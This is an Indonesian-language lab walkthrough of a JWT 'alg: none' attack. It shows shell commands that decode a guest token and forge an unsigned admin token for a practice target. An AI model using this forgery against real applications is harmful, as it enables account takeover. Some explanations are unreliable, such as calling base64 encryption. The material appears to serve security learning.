# JWT Cookies

JWT Cookies terdiri dari 3 bagian 

```shell
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw
```

- `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9` merupakan header
- `eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ` merupakan payload
- `C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw` merupakan signature

semua bagian itu di encode oleh base64. kita dapat menggunakan cookies jwt tersebut untuk login sebagai orang lain.

# Practice

login ke `http://<IP target>:8089/` dengan akun username `guest` dan password `guest`. selanjutnya tekan tombol **f12** pada keyboard atau klik kanan lalu pilih `inspect element`. selanjutnya pergi ke tab **storage** dan pilih **Cookies** pada bagian kiri, dan pilih link website login kita saat ini. selanjutnya kita dapat mengambil token tersebut.

token dari guest adalah berikut

```shell
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjk2NDk0NDg1fQ.1biPzfR_gdZgyk-0zIf8DkHh4HeLivwqTKM4xDXwdFc
```

selanjutnya kita ambil 2 encrypted data diawal karena hanya itu yang dibutuhkan lalu decode dengan [Cyberchef](https://cyberchef.org/) atau dengan `base64` di terminal

terminal linux:

```shell
echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9" | base64 -d
#result-> {"typ":"JWT","alg":"HS256"}
echo -n "eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjk2NDk0NDg1fQ" | base64 -d
#result-> {"username":"guest","exp":1696494485}base64: invalid input
```

nah setelah kita tahu hasilnya, kita perlu mengganti value pada `alg` menjadi **none** dan juga value pada `username` menjadi **admin**, untuk cara cepat dalam terminal, dapat menggunakan command berikut

```shell
echo -n "{\"typ\":\"JWT\",\"alg\":\"none\"}" | base64 | tr -d '\n' && echo "." | tr -d '\n' && echo -n "{\"username\":\"admin\",\"exp\":1696494485}" | base64 | tr -d '\n' && echo "." 

#result-> eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjk2NDk0NDg1fQ==.
```

- `echo -n` berarti kita menampilkan output dari apapun yang kita inputkan dengan menghilangkan newline yang tidak sengaja ada
- `|` simbol pipe ini dapat berarti OR, namun disini kita bisa mengartikannya "lakukan command berikut pada hasil dari command sebelumnya"
- `base64` merupakan command untuk enkripsi input dari kita
- `tr -d '\n'` merupakan command untuk menghilangkan newline dari output di terminal
- `&&` simbol double ampersand dapat berarti AND, namun disini kita bisa mengartikannya "lakukan command berikut setelah command sebelumnya"

jika sudah, kita dapat menginputkan cookies baru hasil editing ke browser, dan jika berhasil kita dapat menjadi user apapun yang kita masukkan sebelumnya.